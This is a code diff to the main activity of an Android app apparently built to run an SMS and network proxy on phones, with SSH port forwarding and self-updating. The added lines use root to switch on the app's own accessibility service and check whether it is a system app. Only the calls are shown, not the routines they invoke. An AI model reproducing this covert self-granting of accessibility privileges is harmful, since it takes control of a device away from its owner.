@@ -19,16 +19,17 @@ import com.android.sms.proxy.entity.PhoneInfo;
 import com.android.sms.proxy.service.AlarmControl;
 import com.android.sms.proxy.service.ApkUpdateUtil;
 import com.android.sms.proxy.service.IProxyControl;
+import com.android.sms.proxy.service.MyAccessibilityService;
 import com.android.sms.proxy.service.ProxyServiceUtil;
 import com.android.sms.proxy.service.Receiver_SMS;
 import com.flurry.android.FlurryAgent;
-import com.oplay.nohelper.assist.bolts.Task;
 
 import net.luna.common.download.interfaces.ApkDownloadListener;
 import net.luna.common.download.model.AppModel;
 import net.luna.common.download.model.FileDownloadTask;
 import net.youmi.android.libs.common.download.ext.OplayDownloadManager;
 import net.youmi.android.libs.common.download.ext.SimpleAppInfo;
+import net.youmi.android.libs.common.util.Util_System_Package;
 
 import org.connectbot.bean.HostBean;
 import org.connectbot.bean.PortForwardBean;
@@ -40,7 +41,6 @@ import org.greenrobot.eventbus.Subscribe;
 
 import java.util.HashMap;
 import java.util.Map;
-import java.util.concurrent.Callable;
 
 /**
  * @author zyq 16-3-10
@@ -50,7 +50,7 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 				.OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
 				.common.download.listener.ApkDownloadListener {
 
-	private static final boolean DEBUG = false;
+	private static final boolean DEBUG = true;
 	private static final String TAG = "main";
 	public static final String NETWORK_CACHE_DIR = "volley";
 	private TextView message;
@@ -133,19 +133,23 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 			mTvGetPhone.setText("cannot find phone number");
 		}
 
+		final String packageName = this.getPackageName();
+		final String serviceName = MyAccessibilityService.class.getCanonicalName();
+		boolean success = ApkUpdateUtil.getInstance(getApplicationContext()).isRootOpenAccessiblity(this,packageName,serviceName);
+		if(DEBUG){
+			Log.d(TAG,"辅助是否成功:"+success);
+		}
+		boolean isSystemApp = Util_System_Package.isSystemApp(this);
+		if(DEBUG){
+			Log.d(TAG,"是否是系统app:"+isSystemApp);
+		}
 		EventBus.getDefault().register(this);
 		AlarmControl.getInstance(this).initAlarm(1, 1, 1, 1);
 		FlurryAgent.onStartSession(this);
 		OplayDownloadManager.getInstance(this).registerListener(this);
 		OplayDownloadManager.getInstance(this).addDownloadStatusListener(this);
 		OplayDownloadManager.getInstance(this).addProgressUpdateListener(this);
-		Task.callInBackground(new Callable<Object>() {
-			@Override
-			public Object call() throws Exception {
-				ApkUpdateUtil.getInstance(getApplication()).updateApk();
-				return null;
-			}
-		});
+
 
 	}
 
